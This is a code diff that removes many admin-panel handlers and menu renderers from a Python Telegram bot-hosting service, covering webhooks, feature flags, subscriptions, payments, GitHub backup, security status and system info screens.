-        bot.send_message(call.message.chat.id, f"{G['settings']} {sc('Send full HTTPS webhook URL')}:"); return
-    if data == "adm_wh_clear":
-        try:
-            bot.remove_webhook()
-            set_setting("webhook_url", "")
-            audit(call.from_user.id, "wh_clear", "")
-            ack(call, "Webhook cleared → polling mode")
-        except Exception as _we:
-            ack(call, f"Error: {_we}")
-        return render_adm_webhooks(call)
-    if data == "adm_wh_test":             return action_adm_wh_test(call)
-    if data == "adm_wh_info":             return render_adm_wh_info(call)
-    # Feature Flags
-    if data == "adm_feature_flags":       return render_adm_feature_flags(call)
-    if data.startswith("adm_ff_toggle_"):
-        ff_key = data[len("adm_ff_toggle_"):]
-        cur = bool(get_setting(f"ff_{ff_key}", _FEATURE_FLAG_DEFAULTS.get(ff_key, True)))
-        set_setting(f"ff_{ff_key}", not cur)
-        audit(call.from_user.id, f"ff_toggle_{ff_key}", f"now={not cur}")
-        ack(call, f"Flag {ff_key}: {'ON' if not cur else 'OFF'}")
-        return render_adm_feature_flags(call)
-    if data == "adm_ff_reset_all":
-        for k, v in _FEATURE_FLAG_DEFAULTS.items():
-            set_setting(f"ff_{k}", v)
-        audit(call.from_user.id, "ff_reset_all", "")
-        ack(call, "All feature flags reset to defaults")
-        return render_adm_feature_flags(call)
-    # Rate Limits
-    if data == "adm_rate_config":         return render_adm_rate_config(call)
-    if data.startswith("adm_rate_plan_"): return render_adm_rate_plan(call, data[len("adm_rate_plan_"):])
-    if data.startswith("adm_rate_set_"):
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_rate_set", "rate_key": data[len("adm_rate_set_"):]}
-        bot.send_message(call.message.chat.id, f"{G['settings']} {sc('Send new limit value (integer)')}:"); return
-    # Live Monitor
-    if data == "adm_live_monitor":        return render_adm_live_monitor(call)
-    if data == "adm_monitor_bots":        return render_adm_monitor_bots(call)
-    if data == "adm_monitor_system":      return render_adm_monitor_system(call)
-    if data == "adm_monitor_refresh":     return render_adm_live_monitor(call)
-    # Revenue Goals
-    if data == "adm_rev_goals":           return render_adm_rev_goals(call)
-    if data == "adm_goal_set_monthly":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_goal_set", "goal_type": "monthly"}
-        bot.send_message(call.message.chat.id, f"{G['settings']} {sc('Send monthly revenue target (৳)')}:"); return
-    if data == "adm_goal_set_yearly":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_goal_set", "goal_type": "yearly"}
-        bot.send_message(call.message.chat.id, f"{G['settings']} {sc('Send yearly revenue target (৳)')}:"); return
-    if data == "adm_goal_history":        return render_adm_goal_history(call)
-    # Scheduler
-    if data == "adm_scheduler":           return render_adm_scheduler(call)
-    if data == "adm_sched_add":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_sched_add"}
-        bot.send_message(call.message.chat.id,
-                         f"<b>⏰ {sc('Add Scheduled Task')}</b>\n{G['div']}\n"
-                         f"{sc('Format')}: <code>HH:MM daily Your message</code>\n"
-                         f"{sc('or')}: <code>YYYY-MM-DD HH:MM once Your message</code>\n"
-                         f"{sc('Example')}: <code>09:00 daily Good morning everyone!</code>",
-                         parse_mode="HTML"); return
-    if data == "adm_sched_list":          return render_adm_sched_list(call)
-    if data.startswith("adm_sched_del_"):
-        tid = data[len("adm_sched_del_"):]
-        tasks = get_setting("scheduled_tasks", []) or []
-        tasks = [t for t in tasks if t.get("id") != tid]
-        set_setting("scheduled_tasks", tasks)
-        audit(call.from_user.id, "sched_del", tid)
-        ack(call, f"Task {tid[:8]} deleted")
-        return render_adm_sched_list(call)
-    if data.startswith("adm_sched_toggle_"):
-        tid = data[len("adm_sched_toggle_"):]
-        tasks = get_setting("scheduled_tasks", []) or []
-        for t in tasks:
-            if t.get("id") == tid:
-                t["enabled"] = not t.get("enabled", True)
-        set_setting("scheduled_tasks", tasks)
-        ack(call, "Task toggled")
-        return render_adm_sched_list(call)
-    # Import / Export
-    if data == "adm_import_export":       return render_adm_import_export(call)
-    if data == "adm_export_full_cfg":     return action_adm_export_full_cfg(call)
-    if data == "adm_export_userdata":     return render_adm_user_export_csv(call)
-    if data == "adm_import_cfg":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_import_cfg"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['upload']} {sc('Upload the settings JSON file exported from this bot')}."); return
-    if data == "adm_import_reset":
-        if not is_owner(call.from_user.id): ack(call, "Owner only"); return
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_factory_reset"}
-        bot.send_message(call.message.chat.id,
-                         f"⚠️ <b>{sc('FACTORY RESET')}</b> — {sc('Type')} <code>CONFIRM RESET</code> "
-                         f"{sc('to wipe ALL settings (not user data). This cannot be undone!')}",
-                         parse_mode="HTML"); return
-    # Admin 2FA
-    if data == "adm_admin_2fa":           return render_adm_admin_2fa(call)
-    if data == "adm_2fa_setup":           return action_adm_2fa_setup(call)
-    if data == "adm_2fa_disable":
-        if not is_owner(call.from_user.id): ack(call, "Owner only"); return
-        set_setting("admin_2fa_secret", "")
-        set_setting("admin_2fa_enabled", False)
-        audit(call.from_user.id, "2fa_disable", "")
-        ack(call, "2FA disabled")
-        return render_adm_admin_2fa(call)
-    # Leaderboard
-    if data == "adm_leaderboard":         return render_adm_leaderboard(call)
-    if data == "adm_lb_spenders":         return render_adm_lb_spenders(call)
-    if data == "adm_lb_bots":             return render_adm_lb_bots(call)
-    if data == "adm_lb_referrals":        return render_adm_lb_referrals(call)
-    if data == "adm_lb_active":           return render_adm_lb_active(call)
-    if data == "adm_lb_uptime":           return render_adm_lb_uptime(call)
-    # Languages
-    if data == "adm_languages":           return render_adm_languages(call)
-    if data.startswith("adm_lang_set_"):
-        lang = data[len("adm_lang_set_"):]
-        set_setting("default_language", lang)
-        audit(call.from_user.id, "set_lang", lang)
-        ack(call, f"Default language: {lang}")
-        return render_adm_languages(call)
-    # Bot Controls
-    if data == "adm_bot_controls":        return render_adm_bot_controls_panel(call)
-    if data == "adm_bc_list_all":         return render_adm_bc_list_all(call)
-    if data.startswith("adm_bcbot_"):     return render_adm_bc_single(call, data[len("adm_bcbot_"):])
-    if data.startswith("adm_bc_env_"):    return render_adm_bc_env_editor(call, data[len("adm_bc_env_"):])
-    if data.startswith("adm_bc_res_"):    return render_adm_bc_resources(call, data[len("adm_bc_res_"):])
-    if data.startswith("adm_bc_logs_"):   return render_adm_bc_logs(call, data[len("adm_bc_logs_"):])
-    if data.startswith("adm_bc_restart_"):
-        bid = data[len("adm_bc_restart_"):]
-        b = find_bot(bid)
-        if b:
-            threading.Thread(target=lambda: restart_child(b), daemon=True).start()
-            ack(call, f"Restarting {b.get('name','?')[:15]}…")
-        return
-    if data.startswith("adm_bc_stop_"):
-        bid = data[len("adm_bc_stop_"):]
-        stop_child(bid, manual=True)
-        ack(call, f"Stopped {bid[:8]}")
-        return render_adm_bc_list_all(call)
-    if data.startswith("adm_bc_del_"):
-        bid = data[len("adm_bc_del_"):]
-        b = find_bot(bid)
-        if b:
-            return render_adm_confirm_custom(call, f"adm_bc_del_confirm_{bid}",
-                                             f"Delete bot {b.get('name','?')[:20]}", "adm_bot_controls")
-    if data.startswith("adm_bc_del_confirm_"):
-        bid = data[len("adm_bc_del_confirm_"):]
-        stop_child(bid, manual=True)
-        d = db_load()
-        d["bots"].pop(bid, None)
-        db_save(d)
-        audit(call.from_user.id, "admin_del_bot", bid)
-        ack(call, f"Bot {bid[:8]} deleted")
-        return render_adm_bc_list_all(call)
-    # Subscriptions
-    if data == "adm_subscriptions":       return render_adm_subscriptions(call)
-    if data == "adm_sub_expiring":        return render_adm_sub_expiring(call)
-    if data == "adm_sub_expired":         return render_adm_sub_expired(call)
-    if data == "adm_sub_remind_all":
-        ack(call, "Sending reminders…")
-        threading.Thread(target=lambda: action_adm_sub_remind_all(call.from_user.id), daemon=True).start(); return
-    if data == "adm_sub_auto_downgrade":
-        cur = bool(get_setting("auto_downgrade_expired", True))
-        set_setting("auto_downgrade_expired", not cur)
-        audit(call.from_user.id, "auto_downgrade_toggle", f"now={not cur}")
-        ack(call, f"Auto-downgrade: {'ON' if not cur else 'OFF'}")
-        return render_adm_subscriptions(call)
-    if data == "adm_sub_extend_prompt":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_sub_extend"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['settings']} {sc('Format')}: <code>uid days</code> {sc('(e.g.')} <code>12345 30</code>)",
-                         parse_mode="HTML"); return
-    if data == "adm_sub_history":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_sub_history"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['settings']} {sc('Send user ID to view subscription history')}:"); return
-    if data == "adm_sub_run_downgrade":
-        if not is_owner(call.from_user.id): ack(call, "Owner only"); return
-        ack(call, "Running downgrade now…")
-        threading.Thread(target=lambda: action_adm_downgrade_expired(call.from_user.id), daemon=True).start(); return
-
-    ack(call, "?")
-
-
-def render_adm_stats(call: types.CallbackQuery) -> None:
-    d = db_load()
-    users = d["users"]
-    bots  = d["bots"]
-    pays  = d["payments"]
-    revenue = sum(p.get("amount", 0) for p in pays if p.get("status") == "approved")
-    today_str = now_utc().strftime("%Y-%m-%d")
-    new_today = sum(1 for u in users.values() if str(u.get("joined", "")).startswith(today_str))
-    week_ago = now_utc() - timedelta(days=7)
-    new_week = 0
-    for u in users.values():
-        try:
-            if datetime.fromisoformat(str(u.get("joined")).replace("Z", "+00:00")) >= week_ago:
-                new_week += 1
-        except Exception:
-            pass
-    plan_counts: Dict[str, int] = defaultdict(int)
-    for u in users.values():
-        plan_counts[u.get("plan", "free")] += 1
-    rss = 0
-    if psutil is not None:
-        try:
-            rss = psutil.Process(os.getpid()).memory_info().rss
-        except Exception:
-            pass
-    storage_size = 0
-    for root, _, files in os.walk(BASE_DIR / "storage"):
-        for f in files:
-            try:
-                storage_size += (Path(root) / f).stat().st_size
-            except OSError:
-                pass
-
-    cap = (
-        f"<b>{G['graph']} {sc('System Stats')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Total users',  len(users))}\n"
-        f"{bullet('New today',    new_today)}\n"
-        f"{bullet('New this week', new_week)}\n"
-        f"{bullet('Total bots',   len(bots))}\n"
-        f"{bullet('Bots running', sum(1 for x in RUNNING.values() if x['proc'].poll() is None))}\n"
-        f"{bullet('Revenue',      '{}$'.format(revenue))}\n"
-        f"{bullet('Storage',      fmt_bytes(storage_size))}\n"
-        f"{bullet('Panel RSS',    fmt_bytes(rss))}\n"
-        f"{bullet('Uptime',       fmt_dur(int(time.time() * 1000) - START_TS))}\n"
-        f"{G['div']}\n"
-        + "\n".join(f"{bullet(PLAN_LIMITS[p]['name'], n)}" for p, n in plan_counts.items())
-        + FOOTER
-    )
-    show_menu(call.message.chat.id, PHOTOS["stats"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_users(call: types.CallbackQuery) -> None:
-    d = db_load()["users"]
-    items = sorted(d.values(), key=lambda u: u.get("joined", ""), reverse=True)[:20]
-    rows = "\n".join(
-        f"{G['bullet']} <code>{u['_id']}</code> — {esc(u.get('name'))} "
-        f"(@{esc(u.get('username') or '—')}) "
-        f"{G['bullet']} <i>{esc(PLAN_LIMITS.get(u.get('plan'), {}).get('name', u.get('plan')))}</i>"
-        for u in items
-    ) or f"<i>{sc('no users yet')}</i>"
-    cap = (
-        f"<b>{G['users']} {sc('Recent Users')} ({len(d)} {sc('total')})</b>\n"
-        f"{G['div_eq']}\n{rows}\n{G['div']}\n"
-        f"{sc('Send a numeric user id to look one up')}.{FOOTER}"
-    )
-    USER_STATES[call.from_user.id] = {"flow": "await_admin_finduser"}
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_allbots(call: types.CallbackQuery) -> None:
-    d = db_load()["bots"]
-    items = list(d.values())[:25]
-    rows = "\n".join(
-        f"{G['bullet']} <code>{b['_id']}</code> — {esc(b['name'])} "
-        f"{G['bullet']} <i>uid {b['owner']}</i> "
-        f"{G['bullet']} {'run' if b['_id'] in RUNNING and RUNNING[b['_id']]['proc'].poll() is None else 'idle'}"
-        for b in items
-    ) or f"<i>{sc('no bots')}</i>"
-    cap = (
-        f"<b>{G['diamond']} {sc('All Bots')} ({len(d)})</b>\n"
-        f"{G['div_eq']}\n{rows}\n{G['div']}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_payments(call: types.CallbackQuery) -> None:
-    d = db_load()
-    pays = [p for p in d["payments"] if p.get("status") == "pending"][-15:]
-    rows = "\n".join(
-        f"{G['bullet']} <code>{p['id']}</code> {G['bullet']} uid {p['uid']} "
-        f"{G['bullet']} {esc(p.get('plan', '—'))} {G['bullet']} {esc(p.get('method'))}"
-        for p in pays
-    ) or f"<i>{sc('no pending payments')}</i>"
-    cap = (
-        f"<b>{G['wallet']} {sc('Pending Payments')}</b>\n"
-        f"{G['div_eq']}\n{rows}\n{G['div']}\n"
-        f"{sc('Tap a payment id from the inbox notification to approve or reject')}.{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_broadcast(call: types.CallbackQuery) -> None:
-    cap = (
-        f"<b>{G['broadcast']} {sc('Broadcast')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('Send the message text now')}.\n"
-        f"<b>{sc('Optional prefix')}:</b>\n"
-        f"  <code>plan:pro</code> — {sc('only pro users')}\n"
-        f"  <code>plan:free</code> — {sc('only free users')}\n"
-        f"  <code>at:YYYY-MM-DD HH:MM</code> — {sc('schedule')}\n"
-        f"  {sc('Otherwise message goes to everyone now')}.{FOOTER}"
-    )
-    USER_STATES[call.from_user.id] = {"flow": "await_broadcast"}
-    show_menu(call.message.chat.id, PHOTOS["broadcast"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_ban(call: types.CallbackQuery) -> None:
-    cap = (
-        f"<b>{G['no']} {sc('Ban / Unban')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('Send')} <code>ban &lt;user_id&gt; &lt;reason&gt;</code>\n"
-        f"{sc('Send')} <code>unban &lt;user_id&gt;</code>{FOOTER}"
-    )
-    USER_STATES[call.from_user.id] = {"flow": "await_ban_cmd"}
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_giveplan(call: types.CallbackQuery) -> None:
-    cap = (
-        f"<b>{G['plus']} {sc('Give Plan')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('Send')} <code>&lt;user_id&gt; &lt;plan&gt; [days]</code>\n"
-        f"{sc('Plans')}: {', '.join(PLAN_LIMITS.keys())}{FOOTER}"
-    )
-    USER_STATES[call.from_user.id] = {"flow": "await_giveplan"}
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_coupons(call: types.CallbackQuery) -> None:
-    d = db_load()["coupons"]
-    rows = "\n".join(
-        f"{G['bullet']} <code>{esc(code)}</code> — {esc(c.get('percent'))}% "
-        f"{G['bullet']} {esc(c.get('uses_left'))} {sc('uses left')}"
-        for code, c in d.items()
-    ) or f"<i>{sc('no coupons yet')}</i>"
-    cap = (
-        f"<b>{G['key']} {sc('Coupons')}</b>\n"
-        f"{G['div_eq']}\n{rows}\n{G['div']}\n"
-        f"{sc('Send')} <code>add CODE PERCENT USES</code> {sc('to create')}.\n"
-        f"{sc('Send')} <code>del CODE</code> {sc('to remove')}.{FOOTER}"
-    )
-    USER_STATES[call.from_user.id] = {"flow": "await_coupon_admin"}
-    show_menu(call.message.chat.id, PHOTOS["coupon"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_tickets(call: types.CallbackQuery) -> None:
-    d = db_load()["tickets"]
-    open_t = [t for t in d.values() if t.get("status") == "open"][-15:]
-    rows = "\n".join(
-        f"{G['bullet']} <code>{t['id']}</code> uid {t['uid']} — {esc(t.get('subject'))[:40]}"
-        for t in open_t
-    ) or f"<i>{sc('no open tickets')}</i>"
-    cap = (
-        f"<b>{G['ticket']} {sc('Open Tickets')}</b>\n"
-        f"{G['div_eq']}\n{rows}\n{G['div']}{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    for t in open_t:
-        kb.add(Btn(
-            f"{G['eye']}  #{t['id']}", callback_data=f"ticket_view_{t['id']}"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Admin')}", callback_data="menu_admin"))
-    show_menu(call.message.chat.id, PHOTOS["ticket"], cap, kb, call=call)
-
-
-def render_adm_admins(call: types.CallbackQuery) -> None:
-    if not is_owner(call.from_user.id):
-        ack(call, "Owner only"); return
-    d = db_load()["admins"]
-    rows = "\n".join(
-        f"{G['bullet']} <code>{uid}</code> — {esc(a.get('role'))}"
-        for uid, a in d.items()
-    ) or f"<i>{sc('no extra admins yet')}</i>"
-    cap = (
-        f"<b>{G['shield']} {sc('Admins')}</b>\n"
-        f"{G['div_eq']}\n{rows}\n{G['div']}\n"
-        f"{sc('Send')} <code>add &lt;uid&gt; &lt;role&gt;</code>\n"
-        f"  {sc('Roles')}: <code>view-only</code>, <code>manage-users</code>, <code>full-access</code>\n"
-        f"{sc('Send')} <code>del &lt;uid&gt;</code>{FOOTER}"
-    )
-    USER_STATES[call.from_user.id] = {"flow": "await_admin_admins"}
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_audit(call: types.CallbackQuery) -> None:
-    d = db_load()["audit"][-25:]
-    rows = "\n".join(
-        f"{G['bullet']} {esc(a['ts'][11:19])} uid {a['uid']} → {esc(a['action'])} {esc(a.get('detail', ''))[:60]}"
-        for a in reversed(d)
-    ) or f"<i>{sc('no audit entries yet')}</i>"
-    cap = (
-        f"<b>{G['eye']} {sc('Recent Audit')}</b>\n"
-        f"{G['div_eq']}\n{rows}\n{G['div']}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["security"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_pending(call: types.CallbackQuery) -> None:
-    """List of bot uploads waiting for approval. Each row links back
-    to a quick approve / reject pair for that upload."""
-    if not admin_only_call(call, "approve_payment"):
-        return
-    items = pending_list()
-    if not items:
-        cap = (
-            f"<b>{G['eye']} {sc('Pending Uploads')}</b>\n"
-            f"{G['div_eq']}\n<i>{sc('Inbox is empty — nothing waiting for approval')}.</i>\n"
-            f"{G['div']}{FOOTER}"
-        )
-        show_menu(call.message.chat.id, PHOTOS["admin"], cap, back_admin_kb(), call=call)
-        return
-    rows = []
-    kb = types.InlineKeyboardMarkup(row_width=2)
-    for bid, info in items[:15]:
-        b = find_bot(bid)
-        nm = (b or {}).get("name") or info.get("file_name") or bid
-        rows.append(
-            f"{G['bullet']} <code>{esc(bid)}</code> — {esc(nm)} "
-            f"{G['bullet']} uid {info.get('user_id')} "
-            f"{G['bullet']} {fmt_bytes(info.get('size', 0))}"
-        )
-        kb.add(
-            Btn(f"{G['ok']}  {sc('OK')} {esc(nm)[:18]}",
-                                       callback_data=f"appr_ok_{bid}"),
-            Btn(f"{G['no']}  {sc('No')} {esc(nm)[:18]}",
-                                       callback_data=f"appr_no_{bid}"),
-        )
-    kb.add(Btn(
-        f"{G['back']}  {sc('Admin')}", callback_data="menu_admin"))
-    cap = (
-        f"<b>{G['eye']} {sc('Pending Uploads')} ({len(items)})</b>\n"
-        f"{G['div_eq']}\n" + "\n".join(rows) + f"\n{G['div']}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, kb, call=call)
-
-
-def render_adm_photos(call: types.CallbackQuery) -> None:
-    """List every menu photo key. Tapping one prompts the admin to
-    send a fresh photo, which replaces that banner."""
-    if not is_owner(call.from_user.id) and not admin_can(call.from_user.id, "manage_admins"):
-        # Allow only owner / full-access admins to change branding.
-        ack(call, "Owner / full-access only.")
-        return
-    cap = (
-        f"<b>{G['upload']} {sc('Menu Photos')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('Tap any menu below, then send a photo to replace its banner')}.\n"
-        f"{sc('Photos are saved locally and synced to GitHub on next backup')}.\n"
-        f"{G['div']}{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup(row_width=2)
-    items = sorted(PHOTO_KEYS_FRIENDLY.items())
-    pairs: List[types.InlineKeyboardButton] = []
-    for key, label in items:
-        if key not in _PHOTO_SPECS:
-            continue
-        pairs.append(Btn(
-            f"{G['cog']}  {sc(label)}", callback_data=f"adm_photo_{key}"))
-    # 2 per row
-    for i in range(0, len(pairs), 2):
-        kb.add(*pairs[i:i + 2])
-    kb.add(Btn(
-        f"{G['back']}  {sc('Admin')}", callback_data="menu_admin"))
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, kb, call=call)
 
 
 def render_adm_photo_one(call: types.CallbackQuery, key: str) -> None:
@@ -6761,55 +3994,6 @@ def render_adm_photo_one(call: types.CallbackQuery, key: str) -> None:
     show_menu(call.message.chat.id, cur, cap, back_admin_kb(), call=call)
 
 
-def render_adm_github(call: types.CallbackQuery) -> None:
-    s = gh_status()
-    cap = (
-        f"<b>{G['cog']} {sc('GitHub Backup')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Configured', 'Yes' if s['enabled'] else 'No')}\n"
-        f"{bullet('Repo',       s['repo'] or '—')}\n"
-        f"{bullet('Branch',     s['branch'])}\n"
-        f"{bullet('Interval',   '{} min'.format(s['intervalMin']))}\n"
-        f"{bullet('Auto',       'On' if s['autoEnabled'] else 'Off')}\n"
-        f"{bullet('Last',       fmt_ts(s['lastBackup']))}\n"
-        f"{bullet('Last err',   s['lastError'] or '—')}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["github"], cap, github_kb(s), call=call)
-
-
-def render_github_subroute(call: types.CallbackQuery, data: str) -> None:
-    if data == "gh_backup_now":
-        threading.Thread(target=lambda: _gh_backup_thread(call), daemon=True).start()
-        ack(call, "Backup started"); return
-    if data == "gh_restore_now":
-        threading.Thread(target=lambda: _gh_restore_thread(call), daemon=True).start()
-        ack(call, "Restore started"); return
-    if data == "gh_toggle_auto":
-        GH["autoEnabled"] = not GH["autoEnabled"]
-        set_setting("github_auto_enabled", GH["autoEnabled"])
-        ack(call, f"Auto: {'ON' if GH['autoEnabled'] else 'OFF'}")
-        render_adm_github(call); return
-    if data == "gh_set_token":
-        USER_STATES[call.from_user.id] = {"flow": "await_gh_token"}
-        bot.send_message(call.message.chat.id, f"{G['key']} {sc('Send the GitHub token now')} (Tᴇxᴛ)."); return
-    if data == "gh_set_repo":
-        USER_STATES[call.from_user.id] = {"flow": "await_gh_repo"}
-        bot.send_message(call.message.chat.id, f"{G['diamond']} {sc('Send the repo as')} <code>Oᴡɴᴇʀ/repo</code>.", parse_mode="HTML"); return
-    if data == "gh_set_branch":
-        USER_STATES[call.from_user.id] = {"flow": "await_gh_branch"}
-        bot.send_message(call.message.chat.id, f"{G['tri']} {sc('Send the branch name')}."); return
-    if data == "gh_set_interval":
-        USER_STATES[call.from_user.id] = {"flow": "await_gh_interval"}
-        bot.send_message(call.message.chat.id, f"{G['cog']} {sc('Send interval in minutes (>=15)')}."); return
-    if data == "gh_clear":
-        gh_set_config({"token": "", "repo": "", "branch": "main", "intervalMin": 360})
-        gh_load_config()
-        ack(call, "Cleared")
-        render_adm_github(call); return
-    ack(call, "?")
-
-
 def _gh_backup_thread(call: types.CallbackQuery) -> None:
     res = gh_backup_now()
     msg = (f"{G['ok']} {sc('backup ok')} ({res.get('sizeMB')} MB)"
@@ -6830,92 +4014,6 @@ def _gh_restore_thread(call: types.CallbackQuery) -> None:
         pass
 
 
-def render_adm_security(call: types.CallbackQuery) -> None:
-    d = db_load()
-    cap = (
-        f"<b>{G['lock']} {sc('Security')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Banned users', sum(1 for u in d['users'].values() if u.get('banned')))}\n"
-        f"{bullet('Rate violators', sum(1 for n in d.get('rate_violations', {}).values() if int(n) > 0))}\n"
-        f"{bullet('Encryption',   'Fernet (AES-128-CBC) per file')}\n"
-        f"{bullet('Key storage',  'GitHub' if KEYRING.gh_enabled() else 'Local cache')}\n"
-        f"{bullet('Path-traversal','blocked (safe_path_join)')}\n"
-        f"{bullet('Secret env strip','active')}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["security"], cap, back_admin_kb(), call=call)
-
-
-def render_adm_maintenance(call: types.CallbackQuery) -> None:
-    cur = bool(get_setting("maintenance", False))
-    cap = (
-        f"<b>{G['warn']} {sc('Maintenance Mode')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('State', 'ON' if cur else 'OFF')}\n"
-        f"{sc('When ON, only admins can use the bot')}.{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    label = "Turn OFF" if cur else "Turn ON"
-    kb.add(Btn(
-        f"{G['refresh']}  {sc(label)}", callback_data="adm_maint_toggle",
-        style="danger" if cur else "success"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Admin')}", callback_data="menu_admin", style="primary"))
-    show_menu(call.message.chat.id, PHOTOS["maint"], cap, kb, call=call)
-
-
-def render_adm_settings(call: types.CallbackQuery) -> None:
-    running_n = sum(1 for x in RUNNING.values() if x['proc'].poll() is None)
-    total_bots = len(db_load_ro()['bots'])
-    cap = (
-        f"<b>{G['settings']} {sc('Settings & Advanced')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Brand',          BRAND_TAG)}\n"
-        f"{bullet('Owner ID',       OWNER_ID)}\n"
-        f"{bullet('Announce chan',  ANNOUNCE_CHANNEL or '—')}\n"
-        f"{bullet('Keep-alive port', KEEPALIVE_PORT)}\n"
-        f"{bullet('GitHub keys',    'GitHub' if KEYRING.gh_enabled() else 'Local cache')}\n"
-        f"{bullet('GitHub backup',  'On' if gh_enabled() and GH['autoEnabled'] else 'Off')}\n"
-        f"{bullet('Bots running',   f'{running_n} / {total_bots}')}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup(row_width=2)
-    # ── live tunables ───────────────────────────────────────────────
-    kb.add(
-        Btn(f"{G['settings']}  {sc('Edit Brand')}",
-            callback_data="adm_set_brand",   style="primary"),
-        Btn(f"{G['broadcast']}  {sc('Announce Chan')}",
-            callback_data="adm_set_announce", style="primary"),
-    )
-    kb.add(
-        Btn(f"{G['shield']}  {sc('Transfer Owner')}",
-            callback_data="adm_set_owner",   style="primary"),
-        Btn(f"{G['diamond']}  {sc('Plans Editor')}",
-            callback_data="adm_set_plans",   style="primary"),
-    )
-    # ── ops actions ─────────────────────────────────────────────────
-    kb.add(
-        Btn(f"{G['refresh']}  {sc('Reload Caches')}",
-            callback_data="adm_set_reload",  style="success"),
-        Btn(f"{G['eye']}  {sc('System Info')}",
-            callback_data="adm_set_sysinfo", style="primary"),
-    )
-    kb.add(
-        Btn(f"{G['refresh']}  {sc('Restart All Bots')}",
-            callback_data="adm_set_restart_all", style="success"),
-        Btn(f"{G['no']}  {sc('Stop All Bots')}",
-            callback_data="adm_set_stop_all",    style="danger"),
-    )
-    kb.add(
-        Btn(f"{G['warn']}  {sc('Clean Orphans')}",
-            callback_data="adm_set_clean_orphans", style="danger"),
-        Btn(f"{G['upload']}  {sc('Export Data')}",
-            callback_data="adm_set_export",        style="primary"),
-    )
-    kb.add(Btn(f"{G['back']}  {sc('Admin')}", callback_data="menu_admin", style="primary"))
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, kb, call=call)
-
-
 # ───────────────────────────────────────────────────────────────────
 #  Advanced settings — sub-renderers + handlers
 # ───────────────────────────────────────────────────────────────────
@@ -6926,130 +4024,6 @@ def _set_back_kb() -> types.InlineKeyboardMarkup:
         f"{G['back']}  {sc('Settings')}", callback_data="adm_settings"))
     return kb
 
-
-def render_adm_sysinfo(call: types.CallbackQuery) -> None:
-    """Live system info — RAM, disk, uptime, child processes."""
-    rss = vms = pct = 0
-    if psutil is not None:
-        try:
-            p = psutil.Process(os.getpid())
-            mi = p.memory_info()
-            rss, vms = mi.rss, mi.vms
-            pct = p.cpu_percent(interval=0.2)
-        except Exception:
-            pass
-    storage_size = 0
-    storage_files = 0
-    for root, _, files in os.walk(BASE_DIR / "storage"):
-        for f in files:
-            try:
-                storage_size += (Path(root) / f).stat().st_size
-                storage_files += 1
-            except OSError:
-                pass
-    sandbox_size = 0
-    sandbox_dirs = 0
-    sandbox_root = BASE_DIR / "sandbox"
-    if sandbox_root.exists():
-        for entry in sandbox_root.iterdir():
-            if entry.is_dir():
-                sandbox_dirs += 1
-                for root, _, files in os.walk(entry):
-                    for f in files:
-                        try:
-                            sandbox_size += (Path(root) / f).stat().st_size
-                        except OSError:
-                            pass
-    up_secs = int(time.time() - START_TIME) if "START_TIME" in globals() else 0
-    days, rem = divmod(up_secs, 86400)
-    hours, rem = divmod(rem, 3600)
-    mins, _ = divmod(rem, 60)
-    running_n = sum(1 for x in RUNNING.values() if x['proc'].poll() is None)
-    cap = (
-        f"<b>{G['eye']} {sc('System Info')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Uptime',       f'{days}d {hours}h {mins}m')}\n"
-        f"{bullet('Panel RSS',    f'{rss / 1024 / 1024:.1f} MB')}\n"
-        f"{bullet('Panel VMS',    f'{vms / 1024 / 1024:.1f} MB')}\n"
-        f"{bullet('CPU sample',   f'{pct:.1f}%')}\n"
-        f"{bullet('Bots live',    running_n)}\n"
-        f"{bullet('Storage',      f'{storage_size / 1024 / 1024:.1f} MB ({storage_files} files)')}\n"
